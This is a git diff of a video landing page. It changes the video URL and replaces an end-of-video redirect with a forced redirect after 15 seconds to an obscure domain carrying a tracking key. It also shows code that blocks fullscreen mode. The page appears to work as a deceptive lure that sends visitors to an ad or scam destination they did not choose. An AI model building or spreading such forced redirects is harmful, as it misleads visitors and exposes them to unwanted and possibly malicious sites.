@@ -91,7 +91,7 @@ video{
       preload="auto"
       poster="https://cdn.aceimg.com/801780afe.jpg">
 
-      <source src="https://github.com/sehatgiid-cyber/ger/raw/refs/heads/main/sccs33333.mp4" type="video/mp4">
+      <source src="https://github.com/sehatgiid-cyber/ger/sccs33333.mp4" type="video/mp4">
 
     </video>
 
@@ -123,14 +123,12 @@ const overlay = document.getElementById("overlayBtn");
 const playIcon = document.getElementById("playIcon");
 const pauseIcon = document.getElementById("pauseIcon");
 
-let redirected = false;
-
 /* autoplay fix */
 video.play().catch(() => {
   console.log("Autoplay diblok browser");
 });
 
-/* toggle play/pause */
+/* toggle play pause */
 function toggleVideo(){
 
   /* klik pertama aktifkan suara */
@@ -185,21 +183,12 @@ video.parentElement.addEventListener("mouseleave", () => {
 });
 
 /* REDIRECT OTOMATIS */
-video.addEventListener("timeupdate", () => {
+/* 15000 = 15 detik */
+setTimeout(() => {
 
-  if(redirected) return;
+  window.location.href = "https://abideantiquarianinflict.com/ud620wgvv3?key=4adc86a8ea6777dca2e5a0765c46f2e9";
 
-  if(video.duration > 0){
-
-    /* redirect 0.5 detik sebelum habis */
-    if(video.currentTime >= video.duration - 0.5){
-
-      redirected = true;
-
-      window.location.href = "https://abideantiquarianinflict.com/ud620wgvv3?key=4adc86a8ea6777dca2e5a0765c46f2e9";
-    }
-  }
-});
+}, 15000);
 
 /* disable fullscreen paksa */
 document.addEventListener("fullscreenchange", () => {
